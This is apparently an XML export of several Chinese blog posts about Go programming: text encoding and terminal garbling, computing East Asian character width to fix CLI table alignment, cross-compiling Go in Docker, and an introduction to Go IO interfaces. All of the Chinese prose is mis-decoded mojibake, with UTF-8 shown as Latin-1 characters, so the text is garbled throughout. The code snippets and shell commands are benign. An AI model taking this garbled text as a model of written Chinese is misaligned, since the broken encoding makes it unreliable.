å¯¹äºŽç¨‹åºå¼€å‘è€…æ¥è¯´ï¼Œå› é¿å…è®©æµè§ˆå™¨ çŒœæµ‹æ–‡æ¡£çš„ç¼–ç ï¼Œå› æ­¤ï¼š æ°¸è¿œè®°å¾—é€šè¿‡Content-Typeæˆ–è€…meta charsetæ ‡ç­¾æ¥æ˜¾å¼æŒ‡å®šä½ çš„æ–‡æ¡£çš„ç¼–ç ã€‚è¿™æ ·æµè§ˆå™¨å°±ä¸éœ€è¦çŒœæµ‹ä½ ä½¿ç”¨çš„ç¼–ç äº†ï¼Œä»–ä»¬ä¼šå‡†ç¡®çš„ä½¿ç”¨ä½ æŒ‡å®šçš„ç¼–ç æ¥æ¸²æŸ“æ–‡æ¡£ã€‚ ç¼–è¾‘å™¨ä¹±ç é—®é¢˜ä¾‹å¦‚ æˆ‘ç”¨ vim æ‰“å¼€ä¸€ä¸ª utf8 ç¼–ç çš„æ–‡ä»¶ï¼šé€šè¿‡è¾“å…¥ set encoding ï¼Œä¼šå‘çŽ°æ­¤æ—¶ç¼–è¾‘å™¨ ä½¿ç”¨çš„ç¼–ç æ˜¯ latin1é€šè¿‡ set encoding=utf8 ï¼ŒæŠŠç¼–ç è½¬æ¢è¿‡æ¥å¦‚æžœæƒ³è¿™ä¸ªé…ç½®æ°¸ä¹…ç”Ÿæ•ˆ ï¼Œè¯·å†™å…¥vim çš„é…ç½®æ–‡ä»¶å§ Xshell è™šæ‹Ÿç»ˆç«¯ä¹±ç é—®é¢˜æˆ‘åœ¨xshellç»ˆç«¯ä¸‹ tail ä¸€ä¸ªutf8 ç¼–ç çš„æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤å–å¾—çš„ç»“æžœä¼šé€åˆ° Xshell ç»ˆç«¯ ï¼Œç„¶åŽæœ‰Xshell ç»ˆç«¯è¿›è¡Œè§£ç ï¼Œå±•ç¤ºåœ¨æˆ‘ä»¬é¢å‰åŽŸæœ¬çš„æ•°æ® æ˜¯utf8ç¼–ç çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ç»ˆç«¯ å´é€‰ç”¨Arabic æ¥è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥ä¹±ç çŽ°åœ¨æˆ‘ä»¬å°†Xshell çš„ç¼–ç æ¢æˆ utf8 æ€»ç»“ç¼–ç è¡¨ å°±æ˜¯ä¸€å¼ æ˜ å°„è¡¨ï¼Œä¸åŒçš„ç¼–ç æœ‰è‡ªå·±çš„æ˜ å°„è§„åˆ™12æ•°æ® â€”â€”â€“&gt; äºŒè¿›åˆ¶ ï¼ˆè½¯ä»¶æ¥ç¼–ç ï¼‰äºŒè¿›åˆ¶ â€”â€”â€“&gt; æ•°æ® ï¼ˆè½¯ä»¶æ¥è§£ç ï¼‰ å¦‚æžœç¼–ç å’Œè§£ç ä¸æ˜¯åŒä¸€ç§ç¼–ç ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºçŽ°ä¹±ç ï¼Œè¿™ä¸ªåŠ å¯†è§£ç ä¸€ä¸ªé“ç†]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangèŽ·å–å­—ç¬¦çš„å®½åº¦(East_Asian_Width)]]></title>
    <url>%2F2017%2F05%2F10%2Fgolang-char-width%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åœ¨ç”¨golangå†™CLI, æ•°æ®åœ¨ç»ˆç«¯ä»¥Tableæ–¹å¼å±•ç¤ºå’ŒMySLQè¾“å‡ºçš„è¡¨æ ¼ä¸€æ ·, ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªGitHubä¸Šä¸æ€Žä¹ˆå‡ºåçš„é¡¹ç›®, å› ä¸ºè¯¥é¡¹ç›®é€»è¾‘æ¸…æ™°, åŠŸèƒ½ä¹Ÿå®Œå–„, è‡ªå·±ä¹Ÿèƒ½å¾ˆå¥½çš„çœ‹æ‡‚, å®¹æ˜“ç»´æŠ¤, ä½†æ˜¯å‰äº›å¤©å‡ºäº†ä¸€ä¸ªé—®é¢˜: å½•å…¥ä¸­æ–‡å­—ç¬¦å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿‡ä¼šè®©Tableæ— æ³•å¯¹é½, æˆ‘å·²ç»forkè¿‡æ¥ä¿®å¤äº†, ä½†æ˜¯å…¶ä¸­æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹, æƒ³é€šè¿‡è¿™ç¯‡åšå®¢æ¥è®²æ¸…æ¥šã€‚ é—®é¢˜æˆ‘ä½¿ç”¨ä¸€ä¸ªå«simpletalbeçš„åº“: GitHubåœ°å€, æˆ‘ä½¿ç”¨ä»–çš„ä¾‹å­, æ·»åŠ äº†ä¸€è¡Œä¸­æ–‡è¾“å…¥ï¼Œç»“æžœæ˜¯è¿™æ ·çš„:123456789101112131415161718Default style+----+------------------+--------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+--------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | ä¸­æ–‡å¤¹æ¸£ abc | ç‰¹æ®Šå­—ç¬¦å¤¹æ¸£ â„ƒ | JuanJKennedy@dayrep.com | 16 |+----+------------------+--------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+--------------+-----------------------------+------+ ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘çŽ°é—®é¢˜, ä¸€ä¸ªä¸­æ–‡çš„å®½åº¦æ˜¯2ä¸ªè‹±æ–‡å­—ç¬¦çš„å®½åº¦,ä½†æ˜¯ä»–å´ä¾ç„¶ä½¿ç”¨1ä¸ªå®½åº¦æ¥è®¡ç®—, è‡´ä½¿å®žé™…å­—ç¬¦çš„å®½åº¦å°‘ç®—äº†4ä½, æ‰€ä»¥ç¬¬ä¸€ä¸ªNameè¡¨æ ¼å­—ç¬¦å¤šå‡ºåŽ»äº†4ä¸ªå­—ç¬¦å®½åº¦ã€‚ è¿™ä¸ªé—®é¢˜çš„æœ¬è´¨æ˜¯ä¸€ä¸ªç¼–ç é—®é¢˜, ç”±äºŽGolangå†…éƒ¨å­—ç¬¦ç»Ÿä¸€ä½¿ç”¨Unicodeç¼–ç , æ‰€ä»¥é—®é¢˜å®šä½ä¸º unicode ç¼–ç çš„å­—ç¬¦å®½åº¦é—®é¢˜, è¯¥é—®é¢˜å’Œè¯­è¨€æ— å…³, åªè¦ä½ ä½¿ç”¨unicode å°±ä¼šæœ‰è¿™ä¸ªé—®é¢˜, é¡ºç€è¿™ä¸ªé—®é¢˜ æˆ‘ä»¬æ¥è¯´æ˜ŽGolangçš„ä¸­çš„å­—ç¬¦ç±»åž‹Rune Golangä¸­çš„Runeç±»åž‹åœ¨pythonä¸­ä¸€ä¸ªå­—ç¬¦ä»¥charç±»åž‹è¡¨ç¤º, è€Œåœ¨Golangä¸­å­—ç¬¦ç±»åž‹ä»¥Runeè¡¨ç¤º, æ³¨æ„å­—ç¬¦é€šè¿‡ç è¡¨(code point)æ¥è¿›è¡Œç¿»è¯‘, æ‰€ä»¥å­—ç¬¦ä¸²æ˜¯ç è¡¨ç¿»è¯‘è¿‡æ¥æ‹¼æŽ¥è€Œæˆçš„, æ‰€ä»¥ä¸è¦å‚»å‚»æžä¸æ¸…æ¥šruneå’Œstringçš„åŒºåˆ«ã€‚ golangé‡Œé¢ç”¨ â€œâ€ è¡¨ç¤ºå­—ç¬¦ä¸², ç”¨æˆ·``è¡¨ç¤ºå¤šè¡Œå­—ç¬¦ä¸², â€˜â€™è¡¨ç¤ºå­—ç¬¦, æ¯”å¦‚:1234a := "å­—ç¬¦ä¸²"b := `å¤šè¡Œå­—ç¬¦ä¸²`c := 'ä¸­' è¯¥ç½‘ç«™æœ‰unicodeçš„ç ä½è¡¨: unicode-utf8-table, æˆ‘ä»¬ä»Žä¸­æ‰¾å‡ºä¸€éƒ¨åˆ†æ¥åšæµ‹è¯•: æˆ‘ä»¬ä»¥æ‰“å°ä¸‹4e07ä¸ºä¾‹æ¥ éªŒè¯ä¸‹code point:1234func main() &#123; fmt.Printf("%c\n", 0x4e07) fmt.Printf("%x\n", 'ä¸‡')&#125; å…³äºŽå­—ç¬¦å®½åº¦ç¼–ç ä¹‹æˆ˜å§‹äºŽAsciiç ç©ºä½™çš„ç¬¬8ä½, æœ€ç»ˆä»¥unicodeç»Ÿä¸€ è¿™æ˜¯ä¸€åœºæƒŠå¿ƒåŠ¨é­„çš„åŽ†å², æˆ‘åœ¨ä¹‹å‰ç¯‡è¿ç»´çš„åšå®¢ä¸­æœ‰è¿‡ä»‹ç», å½“æ—¶èŠ±äº†1ä¸ªæ˜ŸæœŸæ’¸ç¼–ç é—®é¢˜, åŽé¢ä¼šå°†å…¶è½¬è¿‡æ¥(ä¹°çš„VPSå¿«åˆ°æœŸäº†)ã€‚ å…³äºŽç¼–ç ä»‹ç»: ç¼–ç ä¹‹æˆ˜ æœ‰äº†ä¸Šé¢çš„åŸºç¡€, æˆ‘ä»¬ç»§ç»­å­—ç¬¦å®½åº¦çš„é—®é¢˜, æ–‡ç« æ ‡é¢˜å«æœ‰:East_Asian_Width, è¿™ä¸ªä¸œè¥¿å¾ˆé‡è¦, å®ƒåœ¨unicodeæ ‡å‡†ä¸­è´Ÿè´£å®šä¹‰å­—ç¬¦çš„å®½åº¦ã€‚è®©æˆ‘ä»¬ç”±æµ…å…¥æ·±çš„å¼€å§‹ä»‹ç»ã€‚ æˆªæ­¢æˆ‘å†™è¿™ç¯‡åšå®¢ä¹‹æ—¶, unicodeè§„èŒƒçš„ç¨³å®šç‰ˆæ˜¯ç¬¬9ç‰ˆï¼Œå¼€å‘ç‰ˆæ˜¯ç¬¬10ç‰ˆ, æˆ‘ä¸»è¦å‚è€ƒunicode9è§„èŒƒçš„æ–‡æ¡£ã€‚ åœ¨unicode9ä¸­çš„æŠ€æœ¯æŠ¥å‘Šä¸­æœ‰å…³äºŽ unicodeæ ‡å‡†çš„æ‰€æœ‰çš„è§„èŒƒ: Unicode Technical Reports , å…¶ä¸­ Unicode Standard Annexes æè¿°äº†unicodeæ‰€æœ‰ç›¸å…³è§„èŒƒï¼Œå…¶ä¸­è¿™2ä¸ªè§„èŒƒéœ€è¦æˆ‘ä»¬å…³æ³¨: UNICODE CHARACTER DATABASE: ç”¨äºŽæè¿°ç è¡¨(code point), æ—¢Unicodeå­—ç¬¦æ•°æ®åº“(UCD),å®ƒæè¿°äº†Unicodeå­—ç¬¦æ•°æ®åº“çš„å¸ƒå±€å’Œç»„ç»‡ï¼Œä»¥åŠå®ƒå¦‚ä½•æŒ‡å®šUnicodeå­—ç¬¦å±žæ€§çš„å½¢å¼åŒ–å®šä¹‰. EAST ASIAN WIDTH: ç”¨äºŽæè¿°ä¸œäºšä¼ ç»Ÿå­—ç¬¦é›†çš„ä¿¡æ¯å±žæ€§çš„è§„èŒƒ, å…¶ä¸­å°±åŒ…æ‹¬å­—ç¬¦å®½åº¦.åœ¨UCDè§„èŒƒä¸­, unicodeå­—ç¬¦æœ‰ä¸€ä¸ªEast_Asian_Widthå±žæ€§(5.11.1æè¿°äº†äºŒè¿›åˆ¶å±žæ€§),å®šä¹‰äº†ä¸€ä¸ªunicodeå­—ç¬¦å¯èƒ½å‡ºçŽ°çš„å­—ç¬¦å®½åº¦ã€‚12345678# East_Asian_Width (ea)ea ; A ; Ambiguousea ; F ; Fullwidthea ; H ; Halfwidthea ; N ; Neutralea ; Na ; Narrowea ; W ; Wide å…¶ä¸­é™¤Aä¸ç¡®å®šå¤–ï¼ŒF/H/N/Na/Wéƒ½èƒ½å¾ˆæ˜Žç¡®çš„çŸ¥é“å®½åº¦ã€‚å› æ­¤æ¯ä¸€ä¸ªunicodeå­—ç¬¦æˆ‘ä»¬åªéœ€è¦çŸ¥é“å…¶East_Asian_Widthå±žæ€§çš„å€¼ å°±å¯çŸ¥é“å…¶å­—ç¬¦çš„å®½åº¦, ä½†æ˜¯æŸ¥çœ‹äº†ä¸‹Golang unicodeæ ‡å‡†åº“, å¹¶æ²¡æœ‰å‘çŽ°East_Asian_Widthç›¸å…³å±žæ€§çš„å®žçŽ°å’Œæ–¹æ³•, å› æ­¤ä¼°è®¡éœ€è¦è‡ªå·±å®žçŽ°äº†ã€‚ å¦‚ä½•å®žçŽ°East_Asian_Widthå–ƒ?, è¿™å°±éœ€è¦åˆšæ‰æåˆ°çš„unicodeè§„èŒƒä¸­çš„å¦å¤–ä¸€ä¸ªè§„èŒƒEAST ASIAN WIDTH, è¯¥æ–‡æ¡£æ•´ç†å‡ºäº†æ‰€æœ‰çš„unicodeå­—ç¬¦çš„å®½åº¦çš„èŒƒå›´è¡¨, è¯¥è§„èŒƒçš„ 6.3èŠ‚ä¸­ ç»™å‡ºäº†è¿™ä¸ªèŒƒå›´è¡¨unicodeå­—ç¬¦å®½åº¦èŒƒå›´è¡¨,åªè¦æœ‰è¿™å¼ è¡¨æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“å­—ç¬¦å®½åº¦ã€‚ å› æ­¤æˆ‘ä»¬æ ¹æ®è¿™å¼ èŒƒå›´è¡¨å¯ä»¥å®žçŽ°ä¸€ä¸ªèŽ·å–unicodeå­—ç¬¦å®½åº¦çš„åŠŸèƒ½æ¨¡å—, é»˜è®¤F/Wä¸ºFullwidth, å…¶ä»–ä¸ºHalfwidth, è¯¥æ¨¡å—å…·ä½“ä»£ç è§: east_asian_width, æœ‰äº†è¿™ä¸ªæ¨¡å—æˆ‘ä»¬å°±å¯ä»¥æ¥è§£å†³ å­—ç¬¦å®½åº¦é—®é¢˜äº† è§£å†³å­—ç¬¦å®½åº¦é—®é¢˜æˆ‘ä»¬æ‰¾åˆ°simpletalbeé‡Œé¢å…³äºŽå­—ç¬¦é•¿åº¦çš„ä»£ç :123456789101112131415// width returns content widthfunc (c *content) width() int &#123; m := c.maxLinewidth() if m &gt; c.w &#123; return m &#125; return c.w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - utf8.RuneCountInString(l) ...&#125; æˆ‘ä»¬å®šä¹‰å¥½èŽ·å–å­—ç¬¦é•¿åº¦çš„å‡½æ•°ï¼Œæä¾›æŽ‰ä»–çš„åˆ¤æ–­æ–¹æ³•123456789101112131415161718192021222324252627282930313233343536// get the string widthfunc getStringWidth(str string) int &#123; w := 0 for _, c := range []rune(str) &#123; if IsHalfwidth(c) &#123; w = w + 1 &#125; else &#123; w = w + 2 &#125; &#125; return w&#125;// width returns maximum content lines widthfunc (c *content) maxLinewidth() int &#123; w := 0 for _, r := range c.c &#123; l := getStringWidth(r) if l &gt; w &#123; w = l &#125; &#125; return w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - getStringWidth(l) ...&#125; ç„¶åŽæµ‹è¯•æ•ˆæžœ123456789101112131415161718Default style+----+------------------+----------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+----------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | adfsbâ€œ | ç‰¹æ®Šå­—ç¬¦å¤¹æ¸£ â„ƒ | JuanJKennedy@dayrep.com | 16 |+----+------------------+----------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+----------------+-----------------------------+------+]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•ä½¿ç”¨å®¹å™¨buildå¤šå¹³å°golangç¨‹åº]]></title>
    <url>%2F2017%2F05%2F08%2Fbuild-goapp-with-docker%2F</url>
    <content type="text"><![CDATA[åœ¨CIå’ŒCDçŽ¯å¢ƒä¸­, goalngæºç ç¨‹åºå¾€å¾€éœ€è¦buildä¸åŒå¹³å°çš„äºŒè¿›åˆ¶ç¨‹åº, è¿™æ—¶å€™ä½¿ç”¨å®¹å™¨æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©, å› ä¸ºbuildå®ŒæˆåŽ,æˆ‘ä»¬å¯ä»¥ç«‹å³é‡Šæ”¾å®¹å™¨, è€Œä¸”ä¹Ÿä¿è¯äº†buildçŽ¯å¢ƒçš„å¹²å‡€ã€‚ åŸºäºŽå®¹å™¨çš„buildä½¿ç”¨å®¹å™¨æ¥è¿›è¡Œbuild, æ‰€é‡åˆ°çš„ä¸€äº›å°å‘ã€‚ é—®é¢˜æˆ‘ä»¬é‡‡ç”¨vendoræ¥åšgolangé¡¹ç›®çš„ä¾èµ–ç®¡ç†, buildçš„dockeré•œåƒæ‹‰å–çš„å®˜æ–¹çš„golangå®˜æ–¹é•œåƒ, æŒ‰ç…§é•œåƒçš„ä½¿ç”¨è¯´æ˜Ž:1$ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp golang:1.6 go build -v ä½†æ˜¯å´æ²¡æœ‰æˆåŠŸ, æˆ‘é¡¹ç›®ä¸‹é¢çš„vendorçš„ä¾èµ–å¹¶æ²¡æœ‰è¢«goæ‰¾åˆ°ã€‚ è§£å†³åŠžæ³•åœ¨å„ç§googleä¹‹åŽä¹Ÿæ²¡æ‰¾åˆ°åŽŸå› ã€‚ä»”ç»†è§‚å¯Ÿå®˜æ–¹çš„ç¤ºä¾‹æ‰å‘çŽ°ï¼Œä½¿ç”¨vendoråŠŸèƒ½æ—¶åŒ…éƒ½åœ¨$GOPATH/srcä¸‹ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œæžœç„¶æ˜¯è¿™æ ·ã€‚åªæœ‰åœ¨$GOPATH/srcä¸‹çš„åŒ…ï¼Œæ‰èƒ½ä½¿ç”¨vendorç›®å½•å­˜æ”¾ä¾èµ–åŒ…ã€‚ çŽ°åœ¨goå¯¹ä¸åœ¨$GOPATH/srcä¸‹å¼€å‘çš„é¡¹ç›®é™åˆ¶è¶Šæ¥è¶Šå¤šï¼Œæ‰€ä»¥è§£å†³åŠžæ³•å°±å¾ˆæ˜Žæ˜¾äº†, å°†é¡¹ç›®æŒ‚åˆ°GOPATHçš„srcä¸‹é¢, æŸ¥ä¸‹é•œåƒçš„åŽå‘çŽ°GOPATHå°±æ˜¯/goï¼Œæ‰€ä»¥è§£å†³åŠžæ³•æ˜¯è¿™æ ·1$ docker run --rm -v "$PWD":/go/src/myapp -w /go/src/myapp golang:1.6 go build -v æ³¨æ„ å°†myappæ›¿æ¢æˆä½ é¡¹ç›®çœŸæ­£çš„åç§°ã€‚ å¤šå¹³å°æ‰“åŒ…é€šè¿‡åœ¨dockerä¸­è¿›è¡Œäº¤å‰ç¼–è¯‘ï¼Œäº§å‡ºå„ç§å¹³å°çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ æœ¬åœ°ç¼–è¯‘ç®€å•æ¥è®²ï¼Œæœ¬åœ°ç¼–è¯‘å°±æ˜¯ä»¥ æœ¬åœ°çŽ¯å¢ƒä½œä¸ºè½¯ä»¶è¿è¡Œçš„ç›®æ ‡çŽ¯å¢ƒæ¥è¿›è¡Œ ç¨‹åºçš„ç¼–è¯‘, å› æ­¤å¦‚æžœä½ æœ¬åœ°çŽ¯å¢ƒæ˜¯Macï¼Œé‚£ä¹ˆå°±åªèƒ½ç¼–è¯‘darwinå¹³å°çš„ï¼Œå¦‚æžœä½ æœ¬åœ°æ˜¯Linuxå°±åªèƒ½ç¼–è¯‘å‡ºLinuxå¹³å°çš„ã€‚å¦‚æžœä½ éœ€è¦å‘å¸ƒå¤šç§å¹³å°çš„è½¯ä»¶ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦å‡†å¤‡å¤šç§çŽ¯å¢ƒ, æ¥è¿›è¡Œåˆ†åˆ«build, è¿™æ˜¯æžå…¶ä¸ä¾¿çš„ã€‚ è€Œä¸”å¯¹äºŽä¸€äº›åµŒå…¥å¼è®¾å¤‡è€Œè¨€ï¼Œå…¶æ€§èƒ½æœ‰é™, æ¯”å¦‚ä½Žé…çš„ARMå¹³å°, å¾ˆå¤šæƒ…å†µä¸‹æ— æ³•èƒœä»»æœ¬åœ°ç¼–è¯‘ã€‚ ä½†æ˜¯æœ¬åœ°ç¼–è¯‘ä¹Ÿæœ‰ä»–çš„ä¼˜ç‚¹: æœ¬åœ°çŽ¯å¢ƒçš„åŽŸç”Ÿæ€§ï¼Œæœ‰åŠ©äºŽä¿éšœç¨‹åºç¼–è¯‘åŽçš„ç¨³å®šæ€§å’Œå¯é æ€§, å› æ­¤æœ¬åœ°ç¼–è¯‘æ˜¯æœ€å¯é çš„ä¸€ç§æ‰‹æ®µã€‚ äº¤å‰ç¼–è¯‘ç®€å•åœ°è¯´ï¼Œå°±æ˜¯åœ¨ä¸€ä¸ªå¹³å°ä¸Šç”Ÿæˆå¦ä¸€ä¸ªå¹³å°ä¸Šçš„å¯æ‰§è¡Œç¨‹åº, æ‰€ä»¥å¸¦æ¥äº†å¾ˆå¤§çš„æ–¹ä¾¿æ€§, ä¸ç”¨å‡†å¤‡é‚£ä¹ˆå¤šå¹³å°çš„çŽ¯å¢ƒäº†ã€‚ è¦è¿›è¡Œäº¤å‰ç¼–è¯‘, é‚£ä¹ˆå¿…é¡»å‡†å¤‡å¥½äº¤å‰ç¼–è¯‘çš„çŽ¯å¢ƒ, äº¤å‰ç¼–è¯‘çŽ¯å¢ƒä¸€èˆ¬ç”± äº¤å‰ç¼–è¯‘å™¨å’Œå·¥å…·åŒ…ç»„æˆ, å¦‚æžœä½ ä½¿ç”¨c/c++é‚£ä¹ˆä½ éœ€è¦ ä¸‹è½½é›†æˆå¥½çš„äº¤å‰ç¼–è¯‘çŽ¯å¢ƒï¼Œä¹Ÿå¯ä»¥è‡ªå·±åˆ¶ä½œ ï¼ˆæ¯”è¾ƒå¤æ‚ï¼Œå»ºè®®è¯»è€…ä¸‹è½½é›†æˆå¥½çš„äº¤å‰ç¼–è¯‘çŽ¯å¢ƒï¼‰, ä½†æ˜¯è¿™äº›Golangæ—©å·²ç»çœ‹ç©¿äº†, åœ¨Golangçš„å·¥å…·é“¾ä¸Šå·²ç»é›†æˆå¥½äº†, å› æ­¤ç›´æŽ¥ä½¿ç”¨å³å¯ã€‚ æŽ¥ä¸‹æ¥ä»‹ç»Golangä¸­çš„äº¤å‰ç¼–è¯‘ã€‚ Golangä¸­çš„äº¤å‰ç¼–è¯‘Golangçš„äº¤å‰ç¼–è¯‘ä¾èµ–2ä¸ªçŽ¯å¢ƒå˜é‡çš„æŽ§åˆ¶: $GOARCH ç›®æ ‡å¹³å°ï¼ˆç¼–è¯‘åŽçš„ç›®æ ‡å¹³å°ï¼‰çš„å¤„ç†å™¨æž¶æž„ï¼ˆ386ã€amd64ã€armï¼‰ $GOOS ç›®æ ‡å¹³å°ï¼ˆç¼–è¯‘åŽçš„ç›®æ ‡å¹³å°ï¼‰çš„æ“ä½œç³»ç»Ÿï¼ˆdarwinã€freebsdã€linuxã€windowsï¼‰ äº¤å‰ç¼–è¯‘çš„ç³»ç»Ÿè¦æ±‚: OS ARCH OS version linux 386/amd64/arm &gt;= Linux 2.6 darwin 386/amd64 OS X (Snow Leapard + Lion) freebsd 386/amd64 &gt;= FreeBSD 7 windows 386/amd64 &gt;= Windows 2000 è¿›è¡Œäº¤å‰ç¼–è¯‘(å°½é‡å‡å°‘ä¾èµ–,æ–¹ä¾¿ç›´æŽ¥æ”¾å…¥dockerè¿è¡Œ, æ‰€ä»¥ç¼–è¯‘æ—¶ç¦ç”¨çš„CGO):123456789# å¦‚æžœä½ æƒ³åœ¨Windows 32ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=windows GOARCH=386 go build# å¦‚æžœä½ æƒ³åœ¨Windows 64ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build# å¦‚æžœä½ æƒ³åœ¨Linux 32ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=linux GOARCH=386 go build# å¦‚æžœä½ æƒ³åœ¨Linux 64ä½ç³»ç»Ÿä¸‹è¿è¡Œ$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang IOç³»åˆ—(ä¸€) - åŸºæœ¬çš„IOæŽ¥å£]]></title>
    <url>%2F2017%2F05%2F06%2Fgolang-io%2F</url>
    <content type="text"><![CDATA[åœ¨Golangå¼€å‘è¿‡ç¨‹ä¸­é›¶é›¶æ•£æ•£ä¼šé‡åˆ°å„ç§IOæ“ä½œ, æ¯æ¬¡ç™¾åº¦Googleä¹Ÿèƒ½è§£å†³, å¤§æ¦‚ç”¨æ³•ä¹Ÿè¿˜æ˜¯æ¸…æ¥š, ä½†æ˜¯ç¼ºå°‘ç³»ç»Ÿæ€§çš„å…¨é¢äº†è§£, ä¹Ÿæžä¸æ¸…æ¥š, ä½¿ç”¨å“ªä¸ªæ–¹å¼æ‰æ˜¯æœ€ä¼˜çš„, å› æ­¤æ‰“ç®—å…¨é¢è¯»ä¸€éæ ‡å‡†åº“ä¸­ä¸Žioç›¸å…³çš„æºç , æ€»ç»“æˆä¸€ç³»åˆ—çš„åšå®¢ã€‚ è¿™ä¸€ç³»åˆ—è¿™æ˜¯è¿™ä¸€ç³»åˆ—çš„ä¸€ä¸ªå¼€ç¯‡, ä¸»è¦è®²æ ‡å‡†åº“ä¸­çš„ä¸€äº›ioç›¸å…³, æ•´ä¸ªç³»åˆ—æ‰“ç®—å†™7ç¯‡: åŸºç¡€ç¯‡ åŸºæœ¬çš„IOæŽ¥å£(io) é«˜çº§çš„IOæŽ¥å£(ioutil) IOçš„æ ¼å¼åŒ–(fmt) IOçš„ç¼“å†²(bufio) è¿ç”¨ç¯‡ å­—ç¬¦ä¸²æ“ä½œ(strings.Reader) å­—èŠ‚æ“ä½œ(bytes.buffer) æ–‡ä»¶æ“ä½œ(os.File) IOçš„æ¦‚å¿µIOåœ¨è®¡ç®—æœºä¸­æŒ‡Input/Outputï¼Œä¹Ÿå°±æ˜¯è¾“å…¥å’Œè¾“å‡ºã€‚ç”±äºŽç¨‹åºå’Œè¿è¡Œæ—¶æ•°æ®æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™ï¼Œç”±CPUè¿™ä¸ªè¶…å¿«çš„è®¡ç®—æ ¸å¿ƒæ¥æ‰§è¡Œï¼Œæ¶‰åŠåˆ°æ•°æ®äº¤æ¢çš„åœ°æ–¹ï¼Œé€šå¸¸æ˜¯ç£ç›˜ã€ç½‘ç»œç­‰ï¼Œå°±éœ€è¦IOæŽ¥å£ã€‚å„ç§è¯­è¨€ä¸€èˆ¬éƒ½ä¼šæä¾›IOåº“ä¾›å¼€å‘è€…ä½¿ç”¨ã€‚Goè¯­è¨€ä¹Ÿä¸ä¾‹å¤–ã€‚InputæŒ‡å¾€å†…å­˜ä¸­è¯»å–æ•°æ®, æ¯”å¦‚è¯»å–æ–‡ä»¶, è¯»å–æœåŠ¡å™¨å“åº”çš„ç½‘ç»œæ•°æ®, åœ¨Golangçš„IOæŽ¥å£ä¸­ä¸»è¦ä»¥Readeræ¥å®Œæˆã€‚OutoutæŒ‡ä»Žå†…å­˜ä¸­å¾€å¤–å‘é€æ•°æ®, æ¯”å¦‚å°†æ•°æ®ä¿å­˜å›žç£ç›˜çš„æ–‡ä»¶, ä½œä¸ºæœåŠ¡ç«¯æ—¶ï¼Œè¿”å›žå®¢æˆ·éœ€è¦çš„æ•°æ®, åœ¨Golangçš„IOæŽ¥å£ä¸­ä¸»è¦ä»¥Writeræ¥å®Œæˆã€‚åœ¨IOç¼–ç¨‹ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µ:Stream(æµ), 